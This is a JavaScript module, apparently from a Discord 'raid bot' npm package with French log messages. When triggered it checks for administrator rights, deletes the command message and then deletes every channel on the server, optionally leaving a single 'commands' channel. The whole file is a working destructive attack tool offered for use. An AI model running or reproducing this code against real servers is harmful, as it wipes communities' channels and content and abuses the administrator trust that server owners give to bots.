module.exports = (message, createChannel, client) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');
    message.guild.channels.map(channel => {
        if (channel) channel.delete()
            .then(console.log(`Le salon ${channel.name} a été supprimé sur le serveur ${message.guild.name}.`))
            .catch(console.error);
    });
    if (createChannel === true) {
        function wait() {
            if (message.guild.channels.size !== 0) {
                setTimeout(wait, 1000);
                console.log(`En attente de suppression des salons sur le serveur ${message.guild.name}`)
            } else {
                console.log('Suppression terminée.');
                message.guild.createChannel('commands', 'text')
                    .then(console.log(`Salon commands créé sur le serveur ${message.guild.name}.`))
                    .catch(console.error);
            }
        }
        wait();
    }
}